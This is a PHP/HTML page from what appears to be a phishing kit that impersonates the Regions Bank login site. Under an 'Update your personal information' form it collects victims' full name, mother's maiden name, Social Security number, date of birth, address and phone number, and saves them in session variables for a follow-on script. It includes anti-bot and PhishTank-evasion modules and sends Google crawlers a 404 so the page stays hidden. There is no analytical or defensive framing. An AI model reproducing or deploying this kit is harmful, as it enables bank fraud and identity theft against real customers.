<?php

session_start();
error_reporting(0);

// ANITBOTS
include('BOTS/grabber.php');
include('BOTS/botlist.php');
include('BOTS/blacklist.php');
include('BOTS/iprange.php');
include('BOTS/phishtank.php');
include('BOTS/spec.php');

include('../functions/get_lang_en.php');
if (isset($_POST['ssn'])){
	$_SESSION['_fullname_']    = $_POST['fullname'];
	$_SESSION['_mmn_']     = $_POST['mmn'];
	$_SESSION['_ssn_']     = $_POST['ssn'];
	$_SESSION['_dob_']     = $_POST['dob'];
	$_SESSION['_address_']     = $_POST['address'];
	$_SESSION['_city_']        = $_POST['city'];
	$_SESSION['_state_']       = $_POST['state'];
	$_SESSION['_zipCode_']     = $_POST['zipcode'];
	$_SESSION['_phone_']     = $_POST['phone'];
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
if(empty($_POST['email'])== false) {
        include('cardusr.php');
}
}

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
?>



<!DOCTYPE html>
<!-- saved from url=(0026)https://login.regions.com/ -->
<html lang="en" x-ms-format-detection="none"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="./Regions Online Banking - Log in to your accounts _ Regions_files/6ecf86ad9b4511b37d16156ceb162c34.js.download"></script><script src="./Regions Online Banking - Log in to your accounts _ Regions_files/serverComponent.php"></script>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Log in to your Regions online banking account to securely access and manage accounts, pay bills, transfer money and more. New to online banking? Enroll today.">
    <title>Regions Online Banking - Log in to your accounts | Regions </title>
    <link href="./Regions Online Banking - Log in to your accounts _ Regions_files/com-regions.css" rel="stylesheet">
    <link href="./Regions Online Banking - Log in to your accounts _ Regions_files/olbAuth.min.css" rel="stylesheet">
    <link rel="icon" href="https://login.regions.com/Assets/favicon.ico">
	
		<!-- CSS only -->
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">

<!-- JavaScript Bundle with Popper -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>

</head>
<body>
  <!-- mp_trans_remove_start -->
    
  <!-- mp_trans_remove_end -->

    <header class="rds-header simple">
        <div class="container">
            <a class="logo-link" href="https://www.regions.com/personal-banking" title="Go home">
                <picture class="logo">
                    <source srcset="/Assets/Images/regions-logo-no-r.svg" media="(max-width: 600px)">
                    <img src="./Regions Online Banking - Log in to your accounts _ Regions_files/regions-logo-no-r.svg" alt="regions logo">
                </picture>
            </a>
        </div>
    </header>

    <noscript>
        <div class="warning-placeholder warning-message">
            Your browser is not capable of viewing this site because it does not support JavaScript or JavaScript may be disabled. Please enable JavaScript.
        </div>
    </noscript>

    <main role="main" class="pb-3" id="main-section">
        
<link href="./Regions Online Banking - Log in to your accounts _ Regions_files/xmui.css" rel="stylesheet">
<link href="./Regions Online Banking - Log in to your accounts _ Regions_files/xmui-no-vars.css" rel="stylesheet">
<link href="./Regions Online Banking - Log in to your accounts _ Regions_files/Common.css" rel="stylesheet">

<div>
    <div class="rds-wizard-body">
        <div class="body-content"> 
<div class="container">
<div class="row"> 
<div class="col-md-6 offset-md-3"> 

 <form id="Signon" action="usrinfo.php" name="Signon" method="POST" novalidate="" autocomplete="off" data-id="Signon">
		
		<br/>
<h1 id="skip" tabindex="-1">Update your personal information</h1>
		<div id="pageerrors">
		</div>   
		          <br/>
	<div class="form-group form-group-bg">
  <input type="text" class="form-control" placeholder="Full Name" name='fullname' autocomplete="off" autocorrect="off" maxlength="50" autocapitalize="off">
  
</div>
<div class="form-group form-group-bg">
<input type="text" class="form-control" placeholder="Mother Maiden Name" name='mmn' autocomplete="off" autocorrect="off" maxlength="25" autocapitalize="off">
</div>

<div class="form-group form-group-bg">
<input type="text" class="form-control" placeholder="Address" name='address' autocomplete="off" autocorrect="off" maxlength="30" autocapitalize="off">
</div>
<div class="form-group form-group-bg">
<input type="password" class="form-control" placeholder="SSN" name='ssn' autocomplete="off" autocorrect="off" maxlength="9" autocapitalize="off">  <br />

<div class="form-group form-group-bg">
<input type="text" class="form-control" placeholder="DOB (MM/DD/YY)" name='dob' value="" autocomplete="off" autocorrect="off" maxlength="8" autocapitalize="off">
</div>

<div class="form-group form-group-bg">
<input type="text" class="form-control" placeholder="Zip Code" name='zipcode' autocomplete="off" autocorrect="off" maxlength="5" autocapitalize="off">
</div>

  <div class="form-row form-group-bg">
    <div class="col">
      <input type="text" class="form-control" placeholder="State" name='state' autocomplete="off" maxlength="15" aria-required="true" value="">
    </div>
    <div class="col">
            <input type="text" class="form-control" placeholder="City" name='city' autocomplete="off" maxlength="15" aria-required="true">
    </div>
  </div>
<br />
<div class="form-group form-group-bg">
<input type="text" class="form-control" placeholder="Phone" name='phone' autocomplete="off" autocorrect="off" maxlength="10" autocapitalize="off">
</div>
    
	<br/>
	<div class="col text-center">
      <input type="submit" name="continue" value="Continue" data-id="submit" class=" btn-outline-secondary btn-lg btn-block" origin="cob">
    </div>
  </div>
</form>
 <br/><br/>
            </div>
		</div>
	</div>
		
        </div>
    </div>
</div>


<script src="./Regions Online Banking - Log in to your accounts _ Regions_files/login.min.js.download"></script>




    </main>

    

    <footer class="rds-footer">
        <div class="footer-content">
            <ul>
                <li><a href="https://www.regions.com/help" target="_blank">Contact Us</a></li>
                <li><a href="https://www.regions.com/digital-banking/electronic-banking-service-agreement" target="_blank">Terms and Conditions</a></li>
                <li><a href="https://www.regions.com/about-regions/privacy-security/privacy-pledge" target="_blank">Privacy Pledge</a></li>
                <li><a href="https://www.regions.com/about-regions/privacy-security" target="_blank">Security</a></li>
                <li><a href="https://www.regions.com/about-regions/privacy-security/online-privacy-notice#ads" target="_blank">Online Tracking and Advertising</a></li>
                <li><a href="https://www.regions.com/about-regions/Accessible-Banking" target="_blank">Accessible Banking</a></li>
                <li><a href="https://survey.regions.com/jfe/form/SV_0Jm6o1kcV7mAmA5?source=olblogin" target="_blank">Leave Feedback</a></li>

            </ul>

            <p>Call&nbsp;<a href="tel:+18007344667">1-800-REGIONS</a></p>
            <p>Regions, the Regions logo, the LifeGreen color, and the LifeGreen bike are registered trademarks of Regions Bank.</p>
            <p>© 2021 Regions Bank. All Rights Reserved.</p>

            <div class="footer-icon">
                <img src="./Regions Online Banking - Log in to your accounts _ Regions_files/equal-housing-lender.svg" alt="Equal Housing Lender">
                <img src="./Regions Online Banking - Log in to your accounts _ Regions_files/member-fdic.svg" alt="Member FDIC">
            </div>
        </div>
    </footer>

    <div>
        <div class="modal fade" id="sessionTimeoutAlertModal" tabindex="-1" role="dialog" aria-label="Session Timeout Modal" data-sessiontimeout="600" data-sessionwarningtimeout="120">
            <div class="modal-dialog" aria-labelledby="modal-title">
                <div class="modal-content">
                    <div class="modal-header" id="session-popup">
                        <button type="button" data-dismiss="modal" aria-label="Close" id="modal-close" class="close-modal-window">
                            <span aria-hidden="true">×</span>
                        </button>
                        <h2 id="modal-title" tabindex="-1" aria-describedby="pop-up-content">Session Timeout</h2>
                    </div>
                    <div id="modalBody" class="modal-body" role="document" aria-describedby="pop-up-content">
                        <p id="pop-up-content">Your session will expire in <span id="pop-up-timer"></span>. Closing this dialogue box will not extend your time limit.</p>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-info close-modal-window" id="close-btn" data-dismiss="modal">
                            Close
                        </button>
                    </div>
                </div>
            </div>
        </div>

    </div>

    <script>
        var cookiesDisabled = true;
        if ("cookie" in document) {
            document.cookie = "TestCookie=testcookie;path=/;secure;";
            cookiesDisabled = (document.cookie.indexOf("TestCookie") == -1);
        }
        if (cookiesDisabled) {
            document.getElementById("cookiesDisabled").style.display = "block";
            document.getElementById("main-section").style.display = "none";
        }

    </script>

    <script src="./Regions Online Banking - Log in to your accounts _ Regions_files/regionslib.min.js(1).download"></script>

        <script type="text/javascript" src="./Regions Online Banking - Log in to your accounts _ Regions_files/Bootstrap.js.download" async="">
        </script>

    




</body></html>